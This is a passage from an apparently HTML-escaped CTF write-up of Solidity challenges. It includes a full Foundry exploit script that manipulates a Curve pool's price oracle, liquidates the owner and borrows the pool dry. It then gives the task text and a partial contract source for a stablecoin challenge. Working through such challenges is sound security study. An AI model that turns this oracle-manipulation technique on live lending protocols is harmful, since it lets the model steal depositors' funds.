&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;burn_amount
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I found out that &lt;code&gt;price_oracle()&lt;&#x2F;code&gt; is volatile and dependent on &lt;code&gt;ma_last_time&lt;&#x2F;code&gt;, &lt;code&gt;ma_last_time&lt;&#x2F;code&gt;. And the &lt;code&gt;remove_liquidity_imbalance()&lt;&#x2F;code&gt; will make the pool imbalance.&lt;&#x2F;p&gt;
&lt;p&gt;Thats very interesting, let me summarize what I wanted to do here.
- Increase price of asset 1 by adding liquidity and removing liquidity in different blocks
- and liquidate owner and get his 10000 balance of asset0 and
- Borrow remaining asset 0 balance to achieve 20000 asset 0 by depositing asset 1&lt;&#x2F;p&gt;
&lt;p&gt;Thats seems simple but you need to go through a lot of grinding there.&lt;&#x2F;p&gt;
&lt;p&gt;Can&#x27;t explain more, just read my messy exploit script.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Oracle.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;Oracle.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract OracleSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Oracle public oracle = Oracle(0x0F113F8Cd37DdB04c09BBf45D6fafEAa6C7b09E6);
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    SimplePriceOracle public simplePriceOracle;
&lt;&#x2F;span&gt;&lt;span&gt;    CurvePriceOracle public curvePriceOracle;
&lt;&#x2F;span&gt;&lt;span&gt;    ICurve public curvePool;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;@external
&lt;&#x2F;span&gt;&lt;span&gt;@view
&lt;&#x2F;span&gt;&lt;span&gt;@nonreentrant(&amp;#39;lock&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;def price_oracle(i: uint256) -&amp;gt; uint256:
&lt;&#x2F;span&gt;&lt;span&gt;    return self._calc_moving_average(
&lt;&#x2F;span&gt;&lt;span&gt;        self.last_prices_packed[i],
&lt;&#x2F;span&gt;&lt;span&gt;        self.ma_exp_time,
&lt;&#x2F;span&gt;&lt;span&gt;        self.ma_last_time &amp;amp; (2**128 - 1)
&lt;&#x2F;span&gt;&lt;span&gt;    )
&lt;&#x2F;span&gt;&lt;span&gt;*&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        simplePriceOracle = SimplePriceOracle(oracle.priceOracles(0));
&lt;&#x2F;span&gt;&lt;span&gt;        curvePriceOracle = CurvePriceOracle(oracle.priceOracles(1)); &#x2F;&#x2F; curvePool Oracle is for asset 1 
&lt;&#x2F;span&gt;&lt;span&gt;        curvePool = ICurve(curvePriceOracle.curvePool());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, oracle.player());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;assetCount : &amp;quot;, oracle.assetCount());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        (IERC20 assetToken0, uint256 totalDeposited0, uint256 totalBorrowed0, uint256 baseRate0 ) = oracle.assets(0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 address: &amp;quot;, address(assetToken0));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 totalDeposited0 : &amp;quot;, totalDeposited0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 totalBorrowed0 : &amp;quot;, totalBorrowed0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 baseRate0 : &amp;quot;, baseRate0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 priceOracle : &amp;quot;, oracle.priceOracles(0));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        (IERC20 assetToken1, uint256 totalDeposited1, uint256 totalBorrowed1, uint256 baseRate1 ) = oracle.assets(1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 address: &amp;quot;, address(assetToken1));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 totalDeposited1 : &amp;quot;, totalDeposited1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 totalBorrowed1 : &amp;quot;, totalBorrowed1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 baseRate1 : &amp;quot;, baseRate1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 priceOracle : &amp;quot;, oracle.priceOracles(1));
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;---------------Owner-----------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 O_deposited0, uint256 O_borrowed0, uint256 O_lastInterestedBlock0) = oracle.getUserAccount(oracle.owner(), 0, 0 , 0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;deposited0 : &amp;quot;, O_deposited0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;borrowed0 : &amp;quot;, O_borrowed0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;lastInterestedBlock0 : &amp;quot;, O_lastInterestedBlock0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 O_deposited1, uint256 O_borrowed1, uint256 O_lastInterestedBlock1) = oracle.getUserAccount(oracle.owner(), 1, 1 , 1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;deposited1 : &amp;quot;, O_deposited1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;borrowed1 : &amp;quot;, O_borrowed1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;lastInterestedBlock1 : &amp;quot;, O_lastInterestedBlock1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 balance : &amp;quot;, assetToken0.balanceOf(oracle.owner()));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 balance : &amp;quot;, assetToken1.balanceOf(oracle.owner()));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;oracle asset0 balance : &amp;quot;, assetToken0.balanceOf(address(oracle)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;oracle asset1 balance : &amp;quot;, assetToken1.balanceOf(address(oracle)));
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;---------------Player-----------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 P_deposited0, uint256 P_borrowed0, uint256 P_lastInterestedBlock0) = oracle.getUserAccount(player, 0, 0 , 0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;deposited0 : &amp;quot;, P_deposited0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;borrowed0 : &amp;quot;, P_borrowed0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;lastInterestedBlock0 : &amp;quot;, P_lastInterestedBlock0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 P_deposited1, uint256 P_borrowed1, uint256 P_lastInterestedBlock1) = oracle.getUserAccount(player, 1, 1 , 1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;deposited1 : &amp;quot;, P_deposited1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;borrowed1 : &amp;quot;, P_borrowed1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;lastInterestedBlock1 : &amp;quot;, P_lastInterestedBlock1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 balance : &amp;quot;, assetToken0.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 balance : &amp;quot;, assetToken1.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------Price Oracles---------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;simplePriceOracle: &amp;quot;, address(simplePriceOracle));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;simplePriceOracle asset0 Price : &amp;quot;, simplePriceOracle.getAssetPrice(0));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;simplePriceOracle asset1 Price : &amp;quot;, simplePriceOracle.getAssetPrice(1));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;curvePriceOracle (asset 1): &amp;quot;, address(curvePriceOracle));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;curvePriceOracle Curve Pool : &amp;quot;, address(curvePool));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Curve asset0 Price : &amp;quot;, curvePriceOracle.getAssetPrice(0));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Curve asset1 Price : &amp;quot;, curvePriceOracle.getAssetPrice(1)); &#x2F;&#x2F; TARGET = 1200000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Curve SpotPrice : &amp;quot;, curvePriceOracle.getSpotPrice());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;token 0 in curve pool : &amp;quot;, curvePool.coins(0));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;token 1 in curve pool : &amp;quot;, curvePool.coins(1));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Goal is to reduce the price of asset 1 in the pool
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amountOfAsset0 = assetToken0.balanceOf(player);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amountOfAsset1 = assetToken1.balanceOf(player);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; RUN - 1, RUN - 2
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] memory amountsToAdd = new uint256[](2);
&lt;&#x2F;span&gt;&lt;span&gt;        amountsToAdd[0] = amountOfAsset0&#x2F;2;
&lt;&#x2F;span&gt;&lt;span&gt;        amountsToAdd[1] = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        assetToken0.approve(address(curvePool), amountOfAsset0);
&lt;&#x2F;span&gt;&lt;span&gt;        curvePool.add_liquidity(amountsToAdd, 0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;LP balance of Player : &amp;quot;, curvePool.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; RUN - 3
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] memory amountsToRemove = new uint256[](2);
&lt;&#x2F;span&gt;&lt;span&gt;        amountsToRemove[0] = 9999 ether;
&lt;&#x2F;span&gt;&lt;span&gt;        amountsToRemove[1] = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        curvePool.approve(address(curvePool), curvePool.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        curvePool.remove_liquidity_imbalance(amountsToRemove, curvePool.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;  RUN - 4
&lt;&#x2F;span&gt;&lt;span&gt;        assetToken1.approve(address(oracle), amountOfAsset1);
&lt;&#x2F;span&gt;&lt;span&gt;        oracle.liquidate(oracle.owner(), 1, amountOfAsset1, 0);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;  RUN - 5
&lt;&#x2F;span&gt;&lt;span&gt;        assetToken1.approve(address(oracle), amountOfAsset1);
&lt;&#x2F;span&gt;&lt;span&gt;        oracle.deposit(1, amountOfAsset1);
&lt;&#x2F;span&gt;&lt;span&gt;        oracle.borrow(0, 1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;LP balance of Player : &amp;quot;, curvePool.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset0 balance : &amp;quot;, assetToken0.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;asset1 balance : &amp;quot;, assetToken1.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;oracle asset0 balance : &amp;quot;, assetToken0.balanceOf(address(oracle)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;oracle asset1 balance : &amp;quot;, assetToken1.balanceOf(address(oracle)));
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Curve asset1 Price : &amp;quot;, curvePriceOracle.getAssetPrice(1)); &#x2F;&#x2F; TARGET = 1200000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Curve SpotPrice : &amp;quot;, curvePriceOracle.getSpotPrice());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;stablecoin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#stablecoin&quot; aria-label=&quot;Anchor link for: stablecoin&quot;&gt;Stablecoin&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P :
&quot;&quot;&quot;
There is a new algorithmic stablecoin backed by ETH!&lt;&#x2F;p&gt;
&lt;p&gt;Manager owner executes the following code:&lt;&#x2F;p&gt;
&lt;p&gt;manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);&lt;&#x2F;p&gt;
&lt;p&gt;ETH.mint(address(this), 2 ether);
ETH.approve(address(manager), type(uint256).max);
manager.manage(ETH, 2 ether, true, 3395 ether, true);&lt;&#x2F;p&gt;
&lt;p&gt;(, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
manager.updateSignal(debtToken, 3520 ether);
You are given 6000 of ETH. Your goal is to get 50_000_000 of MIM.
&quot;&quot;&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;StableCoin.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC20} from &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {IERC20} from &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {IERC20Metadata} from &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;extensions&#x2F;IERC20Metadata.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {SafeERC20} from &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;utils&#x2F;SafeERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Ownable} from &amp;quot;@openzeppelin&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Math} from &amp;quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;math&#x2F;Math.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;library ProtocolMath {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 internal constant ONE = 1e18;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 internal constant MINUTES_1000_YEARS = 525_600_000;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return (a * b) &#x2F; ONE;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function divDown(uint256 a, uint256 b) internal pure returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return (a * ONE) &#x2F; b;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        if (a == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return 0;
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            return (((a * ONE) - 1) &#x2F; b) + 1;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _decMul(uint256 x, uint256 y) internal pure returns (uint256 decProd) {
&lt;&#x2F;span&gt;&lt;span&gt;        decProd = (x * y + ONE &#x2F; 2) &#x2F; ONE;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _decPow(uint256 base, uint256 exponent) internal pure returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        if (exponent == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return ONE;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 y = ONE;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 x = base;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 n = Math.min(exponent, MINUTES_1000_YEARS);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        while (n &amp;gt; 1) {
&lt;&#x2F;span&gt;&lt;span&gt;            if (n % 2 != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;                y = _decMul(x, y);
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            x = _decMul(x, x);
&lt;&#x2F;span&gt;&lt;span&gt;            n &#x2F;= 2;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return _decMul(x, y);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _computeHealth(uint256 collateral, uint256 debt, uint256 price) internal pure returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return debt &amp;gt; 0 ? collateral * price &#x2F; debt : type(uint256).max;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;abstract contract ManagerAccess {
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable manager;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error Unauthorized(address caller);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyManager() {
&lt;&#x2F;span&gt;&lt;span&gt;        if (msg.sender != manager) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert Unauthorized(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _manager) {
&lt;&#x2F;span&gt;&lt;span&gt;        manager = _manager;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract PriceFeed {
&lt;&#x2F;span&gt;&lt;span&gt;    function fetchPrice() external pure returns (uint256, uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return (2207 ether, 0.01 ether);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Token is ERC20, ManagerAccess {
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _manager, string memory _id) ERC20(_id, _id) ManagerAccess(_manager) {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function mint(address to, uint256 amount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(to, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function burn(address from, uint256 amount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;        _burn(from, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ERC20Signal is ERC20, ManagerAccess {
&lt;&#x2F;span&gt;&lt;span&gt;    using ProtocolMath for uint256;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public signal;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _manager, uint256 _signal, string memory _name, string memory _symbol)
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20(_name, _symbol)
&lt;&#x2F;span&gt;&lt;span&gt;        ManagerAccess(_manager)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        signal = _signal;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function mint(address to, uint256 amount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(to, amount.divUp(signal));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function burn(address from, uint256 amount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;        _burn(from, amount == type(uint256).max ? ERC20.balanceOf(from) : amount.divUp(signal));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setSignal(uint256 backingAmount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 supply = ERC20.totalSupply();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 newSignal = (backingAmount == 0 &amp;amp;&amp;amp; supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
&lt;&#x2F;span&gt;&lt;span&gt;        signal = newSignal;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function totalSupply() public view override returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return ERC20.totalSupply().mulDown(signal);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function balanceOf(address account) public view override returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return ERC20.balanceOf(account).mulDown(signal);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function transfer(address, uint256) public pure override returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function allowance(address, address) public view virtual override returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function approve(address, uint256) public virtual override returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function transferFrom(address, address, uint256) public virtual override returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function increaseAllowance(address, uint256) public virtual override returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function decreaseAllowance(address, uint256) public virtual override returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Manager is Ownable {
&lt;&#x2F;span&gt;&lt;span&gt;    using SafeERC20 for IERC20;
&lt;&#x2F;span&gt;&lt;span&gt;    using ProtocolMath for uint256;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant MIN_DEBT = 3000e18;
